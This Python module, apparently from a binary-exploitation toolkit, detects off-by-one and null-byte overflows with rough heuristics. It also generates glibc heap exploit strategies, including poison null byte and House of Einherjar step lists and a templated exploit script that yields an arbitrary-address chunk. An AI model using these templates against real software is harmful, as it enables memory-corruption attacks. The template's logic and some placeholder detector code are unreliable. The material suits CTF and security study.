"""
Off-by-one and null-byte overflow detection.

Detects:
- Off-by-one write vulnerabilities (heap/stack)
- Null-byte overflow (poison null byte)
- Fence-post errors in loops
- strlen/strcpy boundary issues
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple

from supwngo.core.binary import Binary
from supwngo.vulns.detector import Vulnerability, VulnerabilityDetector, VulnType, VulnSeverity
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class OffByOneType(Enum):
    """Types of off-by-one vulnerabilities."""
    NULL_BYTE = auto()       # Writes single null byte past boundary
    ONE_BYTE = auto()        # Writes one byte past boundary
    HEAP_METADATA = auto()   # Can corrupt heap chunk size
    STACK_CANARY = auto()    # Can overwrite canary's null byte
    POINTER_LOW = auto()     # Can modify pointer's low byte


@dataclass
class OffByOneVuln(Vulnerability):
    """Off-by-one vulnerability details."""
    obo_type: OffByOneType = OffByOneType.NULL_BYTE
    function_name: str = ""
    buffer_size: int = 0
    overflow_offset: int = 0
    can_corrupt_size: bool = False  # For heap chunks
    can_bypass_canary: bool = False  # For stack
    exploitation_notes: str = ""
    name: str = ""


class OffByOneDetector(VulnerabilityDetector):
    """
    Detect off-by-one vulnerabilities.

    Techniques:
    1. Static pattern matching for common mistakes
    2. Loop bound analysis
    3. String function usage analysis
    4. Heap chunk size field proximity
    """

    # Functions that commonly cause off-by-one
    RISKY_STRING_FUNCS = {
        "strcpy": "No bounds checking",
        "strncpy": "May not null-terminate",
        "strncat": "Null terminator overflow",
        "gets": "No bounds checking",
        "fgets": "Off-by-one in size parameter",
        "read": "No null termination",
        "recv": "No null termination",
        "sprintf": "No bounds checking",
        "snprintf": "May not null-terminate",
        "scanf": "No bounds checking on %s",
        "memcpy": "Boundary calculation errors",
    }

    # Patterns indicating loop boundary issues
    LOOP_PATTERNS = [
        # for (i = 0; i <= len; i++)  -- should be i < len
        b"cmp.*<=",
        b"jle",
        b"jbe",
    ]

    def __init__(self, binary: Binary):
        """
        Initialize detector.

        Args:
            binary: Target binary
        """
        self.binary = binary
        self.vulnerabilities: List[OffByOneVuln] = []

    def detect(self) -> List[OffByOneVuln]:
        """
        Detect off-by-one vulnerabilities.

        Returns:
            List of detected vulnerabilities
        """
        self.vulnerabilities = []

        # Check dangerous string functions
        self._check_string_functions()

        # Check for common patterns
        self._check_loop_patterns()

        # Check heap chunk corruption potential
        self._check_heap_corruption()

        # Check stack canary bypass potential
        self._check_canary_bypass()

        return self.vulnerabilities

    def _check_string_functions(self):
        """Check for dangerous string function usage."""
        try:
            elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary

            # Check PLT for imported functions
            if hasattr(elf, 'plt'):
                for func_name in self.RISKY_STRING_FUNCS:
                    if func_name in elf.plt:
                        description = f"Uses {func_name}: {self.RISKY_STRING_FUNCS[func_name]}"
                        obo_type = OffByOneType.ONE_BYTE

                        # Specific analysis per function
                        if func_name in ("strncpy", "snprintf"):
                            obo_type = OffByOneType.NULL_BYTE
                            description += " - may not null-terminate if size equals buffer"
                        elif func_name == "strncat":
                            obo_type = OffByOneType.NULL_BYTE
                            description += " - adds null byte after n characters"
                        elif func_name == "fgets":
                            obo_type = OffByOneType.NULL_BYTE
                            description += " - reads size-1 chars, common off-by-one in size param"

                        vuln = OffByOneVuln(
                            vuln_type=VulnType.STACK_BUFFER_OVERFLOW,
                            severity=VulnSeverity.MEDIUM,
                            address=elf.plt[func_name],
                            description=description,
                            obo_type=obo_type,
                            function_name=func_name,
                            name=f"off-by-one-{func_name}",
                        )

                        self.vulnerabilities.append(vuln)

        except Exception as e:
            logger.debug(f"String function check failed: {e}")

    def _check_loop_patterns(self):
        """Check for fence-post errors in loops."""
        try:
            # Look for <= comparisons that should be <
            # This is a simplified heuristic check

            elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary

            if hasattr(elf, 'read'):
                # Read .text section
                text = elf.get_section_by_name('.text')
                if text:
                    data = text.data()

                    # Count jbe/jle instructions near array access
                    # This is very heuristic-based
                    jbe_count = data.count(b'\x76')  # JBE opcode
                    jle_count = data.count(b'\x7e')  # JLE opcode

                    if jbe_count + jle_count > 10:
                        vuln = OffByOneVuln(
                            vuln_type=VulnType.STACK_BUFFER_OVERFLOW,
                            severity=VulnSeverity.LOW,
                            description=f"Multiple <= comparisons found ({jbe_count + jle_count}), check for fence-post errors",
                            obo_type=OffByOneType.ONE_BYTE,
                            name="potential-fence-post",
                        )
                        self.vulnerabilities.append(vuln)

        except Exception as e:
            logger.debug(f"Loop pattern check failed: {e}")

    def _check_heap_corruption(self):
        """Check if off-by-one could corrupt heap metadata."""
        try:
            elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary

            # If binary uses heap and has off-by-one candidates
            has_malloc = 'malloc' in (elf.plt if hasattr(elf, 'plt') else {})
            has_risky = any(
                f in (elf.plt if hasattr(elf, 'plt') else {})
                for f in ["strcpy", "strncpy", "read", "fgets"]
            )

            if has_malloc and has_risky:
                vuln = OffByOneVuln(
                    vuln_type=VulnType.HEAP_BUFFER_OVERFLOW,
                    severity=VulnSeverity.HIGH,
                    description="Heap allocations with risky string functions - poison null byte possible",
                    obo_type=OffByOneType.HEAP_METADATA,
                    can_corrupt_size=True,
                    name="heap-off-by-one",
                    exploitation_notes="""Poison Null Byte Attack:
1. Allocate chunks A, B, C contiguously
2. Off-by-one null byte overflow from A corrupts B's size LSB
3. If B's size shrinks, free(B) leaves memory in inconsistent state
4. Overlapping chunks can be created for arbitrary write

Requirements:
- glibc < 2.29 for easiest exploitation
- Control over allocation sizes
- Ability to trigger off-by-one overflow""",
                )
                self.vulnerabilities.append(vuln)

        except Exception as e:
            logger.debug(f"Heap corruption check failed: {e}")

    def _check_canary_bypass(self):
        """Check if off-by-one could bypass stack canary."""
        try:
            # Stack canary's lowest byte is always 0x00
            # If we can overflow just that byte, canary remains valid

            has_canary = False
            if hasattr(self.binary, 'protections'):
                has_canary = self.binary.protections.canary
            elif hasattr(self.binary, '_elf') and hasattr(self.binary._elf, 'canary'):
                has_canary = self.binary._elf.canary

            if has_canary:
                # Check for functions that could allow precise overflow
                elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary
                plt = elf.plt if hasattr(elf, 'plt') else {}

                precise_funcs = ["read", "recv", "fread", "fgets"]
                has_precise = any(f in plt for f in precise_funcs)

                if has_precise:
                    vuln = OffByOneVuln(
                        vuln_type=VulnType.STACK_BUFFER_OVERFLOW,
                        severity=VulnSeverity.MEDIUM,
                        description="Stack canary with precise read functions - null byte already matches",
                        obo_type=OffByOneType.STACK_CANARY,
                        can_bypass_canary=True,
                        name="canary-null-byte",
                        exploitation_notes="""Canary Null Byte Note:
- Stack canary's LSB is always 0x00 (null byte)
- If off-by-one writes 0x00, canary check still passes
- Need to overwrite saved RBP/RIP in separate write
- May require information leak for full exploitation""",
                    )
                    self.vulnerabilities.append(vuln)

        except Exception as e:
            logger.debug(f"Canary bypass check failed: {e}")

    def analyze_function(
        self,
        func_addr: int,
        func_name: str = "",
    ) -> List[OffByOneVuln]:
        """
        Analyze specific function for off-by-one bugs.

        Args:
            func_addr: Function address
            func_name: Function name

        Returns:
            List of vulnerabilities in function
        """
        vulns = []

        try:
            # Use capstone for disassembly
            import capstone

            elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary

            # Read function bytes (assume max 0x500 bytes)
            func_data = elf.read(func_addr, 0x500)

            md = capstone.Cs(
                capstone.CS_ARCH_X86,
                capstone.CS_MODE_64 if self.binary.bits == 64 else capstone.CS_MODE_32
            )
            md.detail = True

            # Track register values and memory accesses
            buffer_sizes: Dict[str, int] = {}
            loop_bounds: List[Tuple[int, str]] = []

            for insn in md.disasm(func_data, func_addr):
                # Track lea instructions (often buffer setup)
                if insn.mnemonic == 'lea':
                    # Could extract stack offset to estimate buffer size
                    pass

                # Track cmp with <= patterns
                if insn.mnemonic == 'cmp':
                    pass

                # Track jbe/jle after cmp (potential fence-post)
                if insn.mnemonic in ('jbe', 'jle'):
                    loop_bounds.append((insn.address, str(insn)))

                # Track calls to risky functions
                if insn.mnemonic == 'call':
                    for risky_func in self.RISKY_STRING_FUNCS:
                        # This is simplified - real impl would resolve call target
                        pass

        except ImportError:
            logger.debug("capstone not available for detailed analysis")
        except Exception as e:
            logger.debug(f"Function analysis failed: {e}")

        return vulns


def analyze_for_null_byte_poison(
    chunk_sizes: List[int],
    overflow_offset: int,
) -> Dict[str, Any]:
    """
    Analyze heap layout for null byte poison attack.

    Args:
        chunk_sizes: List of chunk sizes in allocation order
        overflow_offset: Offset where overflow occurs in first chunk

    Returns:
        Attack analysis
    """
    result = {
        "feasible": False,
        "reason": "",
        "steps": [],
        "target_chunk_idx": -1,
    }

    if not chunk_sizes:
        result["reason"] = "No chunk sizes provided"
        return result

    # Calculate actual chunk sizes (add heap metadata)
    METADATA_SIZE = 0x10  # prev_size + size fields
    MIN_CHUNK = 0x20

    actual_sizes = []
    for size in chunk_sizes:
        # Round up to alignment
        actual = max((size + METADATA_SIZE + 0xf) & ~0xf, MIN_CHUNK)
        actual_sizes.append(actual)

    # Calculate chunk positions
    positions = [0]
    for size in actual_sizes[:-1]:
        positions.append(positions[-1] + size)

    # Check if overflow can reach next chunk's size field
    first_chunk_data_start = positions[0] + METADATA_SIZE
    overflow_target = first_chunk_data_start + overflow_offset

    for i, pos in enumerate(positions[1:], 1):
        size_field_pos = pos + 0x8  # prev_size + size offset

        if overflow_target == size_field_pos:
            result["feasible"] = True
            result["target_chunk_idx"] = i
            result["steps"] = [
                f"1. Allocate {len(chunk_sizes)} chunks with sizes: {chunk_sizes}",
                f"2. Overflow from chunk 0 at offset {overflow_offset}",
                f"3. Null byte corrupts chunk {i}'s size field LSB",
                f"4. Chunk {i}'s size becomes 0x{actual_sizes[i] & 0xffffff00:x}",
                f"5. Free chunk {i} to create overlapping region",
                "6. Use overlapping chunks for arbitrary write",
            ]
            break

    if not result["feasible"]:
        result["reason"] = "Overflow doesn't reach any chunk size field"

    return result


class NullByteExploiter:
    """
    Generate exploits for null byte overflow bugs.

    Implements:
    - Poison null byte on heap
    - House of Einherjar variant
    - Chunk size corruption
    """

    def __init__(self, libc_version: str = "2.31"):
        """
        Initialize exploiter.

        Args:
            libc_version: Target glibc version
        """
        self.version = libc_version
        parts = libc_version.split(".")
        self.minor = int(parts[1]) if len(parts) > 1 else 31

    def poison_null_byte_exploit(
        self,
        vuln_chunk_size: int,
        target_addr: int,
    ) -> Dict[str, Any]:
        """
        Generate poison null byte exploit strategy.

        Args:
            vuln_chunk_size: Size of chunk with overflow
            target_addr: Target address for write primitive

        Returns:
            Exploit strategy
        """
        result = {
            "technique": "poison_null_byte",
            "glibc_version": self.version,
            "feasible": True,
            "steps": [],
            "chunk_layout": [],
            "code": "",
        }

        # Check glibc version constraints
        if self.minor >= 29:
            result["note"] = "glibc 2.29+ has additional checks, harder but possible"

        # Calculate optimal chunk sizes
        # Chunk B needs size like 0x100 so null byte makes it 0x00
        b_size = 0x100 - 0x10  # Request size to get 0x100 chunk

        result["chunk_layout"] = [
            {"name": "A", "size": vuln_chunk_size, "purpose": "Overflow source"},
            {"name": "B", "size": b_size, "purpose": "Size corruption target"},
            {"name": "C", "size": 0x80, "purpose": "Prevent consolidation"},
        ]

        result["steps"] = [
            "1. Allocate chunk A (overflow source)",
            "2. Allocate chunk B with size 0x100 (0xf0 request)",
            "3. Allocate chunk C (guard chunk)",
            "4. Free chunk B (goes to unsorted bin if tcache full)",
            "5. Trigger overflow: null byte corrupts B's prev_inuse bit",
            "6. malloc(0x100 - 0x10) gets overlapping chunk",
            "7. Use overlap to corrupt FD pointer",
            f"8. Poison with target: 0x{target_addr:x}",
            "9. Two more allocations to get target as chunk",
        ]

        result["code"] = f'''
# Poison null byte exploit
def exploit():
    # Setup
    A = alloc({vuln_chunk_size})
    B = alloc(0xf0)  # 0x100 chunk
    C = alloc(0x80)  # Guard

    # Free B to put in bins
    free(B)

    # Trigger off-by-one null byte overflow from A
    # This corrupts B's prev_inuse bit
    edit(A, b'A' * {vuln_chunk_size} + b'\\x00')

    # Now allocate overlapping chunk
    D = alloc(0xf0)  # Overlaps with freed B region

    # D and B overlap - corrupt B's fd to target
    edit(D, p64(0x{target_addr:x}))

    # Two allocations to reach target
    alloc(0xf0)  # Returns B
    target_chunk = alloc(0xf0)  # Returns target!

    return target_chunk
'''

        return result

    def house_of_einherjar(
        self,
        controlled_chunk_size: int,
        target_addr: int,
    ) -> Dict[str, Any]:
        """
        Generate House of Einherjar exploit.

        Uses null byte overflow to fake consolidation.

        Args:
            controlled_chunk_size: Size of controlled chunk
            target_addr: Target address

        Returns:
            Exploit strategy
        """
        result = {
            "technique": "house_of_einherjar",
            "glibc_version": self.version,
            "feasible": self.minor < 29,  # Harder on newer glibc
            "steps": [],
        }

        if self.minor >= 29:
            result["note"] = "Requires additional heap leak for unlink checks bypass"

        result["steps"] = [
            "1. Allocate chunk A",
            "2. Allocate chunk B (target for null byte)",
            "3. Create fake chunk in A pointing to target area",
            "4. Set fake prev_size in B to reach fake chunk",
            "5. Null byte overflow clears B's prev_inuse",
            "6. free(B) triggers backward consolidation",
            "7. Malloc returns chunk overlapping target",
        ]

        return result

    def summary(self) -> str:
        """Get technique summary."""
        return f"""
Null Byte Overflow Exploitation
===============================
glibc version: {self.version}

Techniques:
- Poison Null Byte: Corrupt chunk size via null overflow
- House of Einherjar: Fake backward consolidation

Applicability:
- glibc < 2.29: Full exploitation possible
- glibc 2.29+: Need heap leak for unlink bypass
- glibc 2.32+: Also need safe-linking bypass
"""
